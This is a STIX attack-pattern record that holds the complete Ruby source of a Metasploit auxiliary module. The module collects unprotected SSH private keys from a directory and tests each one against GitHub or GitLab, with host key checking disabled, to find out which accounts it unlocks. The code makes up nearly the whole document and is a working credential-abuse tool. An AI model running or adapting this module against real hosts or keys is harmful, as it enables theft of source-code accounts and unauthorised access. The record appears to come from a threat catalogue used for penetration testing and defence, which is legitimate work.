{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f14cb51-858e-4324-9dfb-7ac89e1cff1b",
    "created": "2024-08-14T16:27:29.885135Z",
    "modified": "2024-08-14T16:27:29.885139Z",
    "name": "Test SSH Github Access",
    "description": "( This module will attempt to test remote Git access using (.ssh/id_* private keys). This works against GitHub and GitLab by default, but can easily be extended to support more server types. ) 'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/ssh_enum_git_keys.rb",
            "external_id": "ssh_enum_git_keys.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://docs.github.com/en/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'          => 'Test SSH Github Access',\n        'Description'   => %q(\n          This module will attempt to test remote Git access using\n          (.ssh/id_* private keys). This works against GitHub and\n          GitLab by default, but can easily be extended to support\n          more server types.\n        ),\n        'License'       => MSF_LICENSE,\n        'Author'        => ['Wyatt Dahlenburg (@wdahlenb)'],\n        'Platform'      => ['linux'],\n        'SessionTypes'  => ['shell', 'meterpreter'],\n        'References'    => [['URL', 'https://docs.github.com/en/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection']]\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('KEY_FILE', [false, 'Filename of a private key.', nil]),\n        OptPath.new('KEY_DIR', [false, 'Directory of several keys. Filenames will be recursivley found matching id_* (Ex: /home/user/.ssh)', nil]),\n        OptString.new('GITSERVER', [true, 'Parameter to specify alternate Git Server (GitHub, GitLab, etc)', 'github.com'])\n      ]\n    )\n    deregister_options(\n      'RHOST', 'RHOSTS', 'PASSWORD', 'PASS_FILE', 'BLANK_PASSWORDS', 'USER_AS_PASS', 'USERPASS_FILE', 'DB_ALL_PASS', 'DB_ALL_CREDS'\n    )\n\n  end\n\n  # OPTPath will revert to pwd when set back to \"\"\n  def key_dir\n    datastore['KEY_DIR'] != `pwd`.strip ? datastore['KEY_DIR'] : \"\"\n  end\n\n  def key_file\n    datastore['KEY_FILE'] != `pwd`.strip ? datastore['KEY_FILE'] : \"\"\n  end\n\n  def has_passphrase?(file)\n    response = `ssh-keygen -y -P \"\" -f #{file} 2>&1`\n    return response.include? 'incorrect passphrase'\n  end\n\n  def read_keyfile(file)\n    if file.is_a? Array\n      keys = []\n      file.each do |dir_entry|\n        next unless ::File.readable? dir_entry\n\n        keys.concat(read_keyfile(dir_entry))\n      end\n      return keys\n    else\n      keyfile = ::File.open(file, \"rb\") { |f| f.read(f.stat.size) }\n    end\n    keys = []\n    this_key = []\n    in_key = false\n    keyfile.split(\"\\n\").each do |line|\n      in_key = true if (line =~ /^-----BEGIN ([RD]SA|OPENSSH) PRIVATE KEY-----/)\n      this_key << line if in_key\n      if (line =~ /^-----END ([RD]SA|OPENSSH) PRIVATE KEY-----/)\n        in_key = false\n        keys << file unless has_passphrase?(file)\n      end\n    end\n    if keys.empty?\n      print_error \"#{file} - No valid keys found\"\n    end\n    return keys\n  end\n\n  def parse_user(output)\n    vprint_status(\"SSH Test: #{output}\")\n    if (output =~ /You\\'ve successfully authenticated/)\n      return output.match(/Hi (.*)\\! You\\'ve successfully authenticated/)[1]\n    elsif (output =~ /Welcome to GitLab, \\@(.*)\\!$/)\n      return output.match(/Welcome to GitLab, \\@(.*)\\!$/)[1]\n    end\n  end\n\n  def check_git_keys(queue)\n    threads = datastore['THREADS']\n    return {} if queue.blank?\n\n    threads = 1 if threads <= 0\n\n    results = {}\n    until queue.empty?\n      t = []\n      threads = 1 if threads <= 0\n\n      if queue.length < threads\n        threads = queue.length\n      end\n\n      begin\n        1.upto(threads) do\n          t << framework.threads.spawn(\"Module(#{refname})\", false, queue.shift) do |file|\n            Thread.current.kill unless file\n\n            config_contents = \"Host gitserver\\n\\tUser git\\n\\tHostname #{datastore['GITSERVER']}\\n\\tPreferredAuthentications publickey\\n\\tIdentityFile #{file}\\n\"\n\n            rand_file = Rex::Quickfile.new\n            rand_file.puts config_contents\n            rand_file.close\n\n            output = `ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T -F #{rand_file.path} gitserver 2>&1`\n            if output.include? \"\\n\"\n              output = output.split(\"\\n\")[-1]\n            end\n            user = parse_user(output)\n            if user\n              results[file] = user\n            end\n            rand_file.delete\n          end\n        end\n        t.map(&:join)\n      rescue ::Timeout::Error\n      ensure\n        t.each { |x| x.kill rescue nil }\n      end\n    end\n    return results\n  end\n\n  def test_keys\n    if key_file && File.readable?(key_file)\n      keys = Array(read_keyfile(key_file))\n    elsif !key_dir.nil? && !key_dir.empty?\n      return :missing_keyfile unless (File.directory?(key_dir) && File.readable?(key_dir))\n\n      @key_files ||= Dir.glob(\"#{key_dir}/**/id_*\", File::FNM_DOTMATCH).reject { |f| f.include? '.pub' }\n      vprint_status(\"Identified #{@key_files.size} potential keys\")\n      keys = read_keyfile(@key_files)\n    else\n      return {}\n    end\n\n    check_git_keys(keys)\n  end\n\n  def run\n    if datastore['KEY_FILE'].nil? && datastore['KEY_DIR'].nil?\n      fail_with Failure::BadConfig, 'Please specify a KEY_FILE or KEY_DIR'\n    elsif !(key_file.blank? ^ key_dir.blank?)\n      fail_with Failure::BadConfig, 'Please only specify one KEY_FILE or KEY_DIR'\n    end\n\n    results = test_keys\n    return if results.empty?\n\n    keys_table = Rex::Text::Table.new(\n      'Header' => \"Git Access Data\",\n      'Columns' => [ 'Key Location', 'User Access' ]\n    )\n\n    results.each do |key, user|\n      keys_table << [key, user]\n    end\n\n    print_line(keys_table.to_s)\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}